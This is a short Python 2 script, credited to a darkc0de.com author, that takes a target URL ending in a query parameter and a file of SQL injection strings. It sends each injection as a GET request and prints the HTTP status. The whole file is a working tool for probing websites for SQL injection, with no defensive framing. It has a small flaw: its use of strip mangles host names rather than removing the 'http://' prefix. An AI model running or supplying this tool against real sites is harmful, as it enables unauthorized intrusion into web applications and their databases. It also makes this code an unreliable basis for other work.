#!/usr/bin/python 
#Gets http response from a list of sql injections. 
 
#http://www.darkc0de.com 
#d3hydr8[at]gmail[dot]com 
 
import sys, httplib 
 
def main(host, path): 
	try: 
		conn = httplib.HTTPConnection(host)
		conn.request("GET", path) 
		r1 = conn.getresponse()
		print "[+]",host+path,":",r1.status, r1.reason
	except: 
		print "[-] Error Occurred" 
		pass 
 
if len(sys.argv) != 3: 
	print "\nUsage: ./sqlresp.py <site> <list of injections>" 
	print "Example: ./sqlresp.py www.site.com/buy.php?id= injections.txt\n"
	sys.exit(1) 
 
print "\n   d3hydr8[at]gmail[dot]com sqlResp v1.0" 
print "----------------------------------------------" 

try:
  	injects = open(sys.argv[2], "r").readlines()
except(IOError): 
  	print "Error: Check your injections path\n"
  	sys.exit(1)

host = sys.argv[1].strip("http://")
if host[-1:] != "=":
	print "\n[-] No '=' on the end of address"
	print "[+] adding '='"
	host = host+"="
print "\n[+] Site:",host
print "[+] Injections Loaded:",len(injects),"\n\n"
 
for inj in injects:
	try:
		main(host.split("/",1)[0], host.split("/",1)[1]+inj.strip("\n"))
	except(IndexError):
		print "[-] Invalid Address\n"
		sys.exit(1)
print "\n[+] Done\n"